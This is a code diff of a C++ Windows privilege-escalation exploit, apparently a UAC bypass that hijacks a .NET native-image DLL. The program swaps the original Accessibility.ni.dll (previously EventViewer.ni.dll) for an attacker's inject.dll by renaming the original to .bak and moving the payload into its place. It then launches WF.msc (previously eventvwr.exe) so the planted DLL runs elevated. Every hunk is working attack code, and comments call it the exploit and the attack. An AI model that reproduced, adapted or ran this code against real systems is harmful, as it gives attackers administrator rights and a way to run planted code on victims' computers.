@@ -134,7 +134,7 @@ int main()
 	}
 
 	std::wstring fullPath{ path }, cmdPath{ systemPath }, explorer{ path };
-	fullPath += L"\\assembly\\NativeImages_v4.0.30319_64\\EventViewer\\*.*";
+	fullPath += L"\\assembly\\NativeImages_v4.0.30319_64\\Accessibility\\*.*";
 	cmdPath += L"\\cmd.exe";
 	explorer += L"\\explorer.exe";
 	CoTaskMemFree(path);
@@ -166,7 +166,7 @@ int main()
 	fullPath.pop_back();
 	fullPath.pop_back();
 	fullPath += findData.cFileName;
-	fullPath += L"\\EventViewer.ni.dll";
+	fullPath += L"\\Accessibility.ni.dll";
 
 	FindClose(findHandle);
 
@@ -332,7 +332,7 @@ int main()
 
 	 /*
 	  *	STAGE 4
-	  *	Delete the original EventViewer.ni.dll file and move our inject.dll file with the correct name over there
+	  *	Delete the original Accessibility.ni.dll file and move our inject.dll file with the correct name over there
 	  */
 
 	IShellItem* existingFile, * targetFile, * targetFolder;
@@ -346,7 +346,7 @@ int main()
 		std::cout << "SHCreateItemFromParsingName() (0) failed. HRESULT: 0x" << std::hex << result << std::endl;
 		return EXIT_FAILURE;
 	}
-	fullPath = fullPath.substr(0, fullPath.size() - 18);
+	fullPath = fullPath.substr(0, fullPath.size() - std::wcslen(L"Accessibility.ni.dll"));
 	result = SHCreateItemFromParsingName(fullPath.c_str(), nullptr, IID_IShellItem, reinterpret_cast<void**>(&targetFolder));
 	if (FAILED(result))
 	{
@@ -377,7 +377,7 @@ int main()
 
 	delete[] currentDirectory;
 
-	result = fileOperation->RenameItem(existingFile, L"EventViewer.ni.dll.bak", nullptr);
+	result = fileOperation->RenameItem(existingFile, L"Accessibility.ni.dll.bak", nullptr);
 	if (FAILED(result))
 	{
 		targetFile->Release();
@@ -388,7 +388,7 @@ int main()
 		std::cout << "IFileOperation::DeleteItem() failed. HRESULT: 0x" << std::hex << result << std::endl;
 		return EXIT_FAILURE;
 	}
-	result = fileOperation->MoveItem(targetFile, targetFolder, L"EventViewer.ni.dll", nullptr);
+	result = fileOperation->MoveItem(targetFile, targetFolder, L"Accessibility.ni.dll", nullptr);
 	if (FAILED(result))
 	{
 		targetFile->Release();
@@ -438,7 +438,7 @@ int main()
 	  *	Launch Event Viewer via eventvwr.exe to execute the exploit and do the attack.
 	  */
 
-	if (reinterpret_cast<int>(ShellExecuteW(nullptr, L"open", L"eventvwr.exe", nullptr, nullptr, SW_NORMAL)) <= 32)
+	if (reinterpret_cast<int>(ShellExecuteW(nullptr, L"open", L"WF.msc", nullptr, nullptr, SW_NORMAL)) <= 32)
 	{
 		std::cout << "ShellExecuteW() failed.\n";
 		return EXIT_FAILURE;
